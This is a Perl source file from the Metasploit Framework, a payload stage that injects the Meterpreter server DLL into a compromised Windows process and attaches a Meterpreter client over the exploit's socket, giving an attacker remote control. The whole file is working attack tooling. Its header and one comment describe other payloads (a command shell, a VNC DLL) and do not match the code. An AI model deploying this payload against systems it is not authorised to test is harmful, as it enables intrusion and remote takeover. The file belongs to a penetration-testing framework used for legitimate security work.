###############
##
#
#    Name: ShellStage.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      Calls RevertToSelf and then creates a command interpreter
#      with input/output redirected to the file descriptor from the
#      first stage.
#
##
###############

package Msf::PayloadComponent::Windows::ia32::InjectMeterpreterStage;

use strict;
use base 'Msf::PayloadComponent::Windows::ia32::InjectLibStage';
use FindBin qw{$RealBin};
use Pex::Meterpreter::Client;

my $info =
{
	'Authors'       => 
		[
			'skape <mmiller [at] hick.org>',
		],
	'UserOpts'      => 
		{ 
			'METDLL'  => [1, 'PATH', 'The full path the meterpreter server dll', "$RealBin/data/meterpreter/metsrv.dll"],
		},
	'NonShellStage' => 1
};

sub new
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash);

	return $self;
}

#
# Returns the path of the VNC DLL that is to be injected
#
sub _InjectDLL 
{
	my $self = shift;

	return $self->GetVar('METDLL');
}

#
# Returns the pseudo-name of the DLL that is being injected
#
sub _InjectDLLName
{
	my $self = shift;

	return "metsrv.dll";
}

#
# Establishes the meterpreter client connection
#
sub HandleConnection 
{
	my $self = shift;
	my $sock = $self->PipeRemoteOut;

	$self->SUPER::HandleConnection;
	sleep(1);

	# Start the meterpreter client
	my $client = Pex::Meterpreter::Client->new(
			consoleIn  => $self->PipeLocalIn,
	 		consoleOut => $self->PipeLocalOut,
			socketIn   => $self->PipeRemoteIn,
			socketOut  => $self->PipeRemoteOut);

	# Did it succeed?
	if (not defined($client))
	{
		$self->PrintLine("[*] Could not create meterpreter client instance.");
		$self->KillChild();

		return;
	}

	# Run it.
	$client->run();

	$self->PrintLine("[*] Meterpreter client finished.");

	$sock->close();
	$self->KillChild();

	return;

}

1;
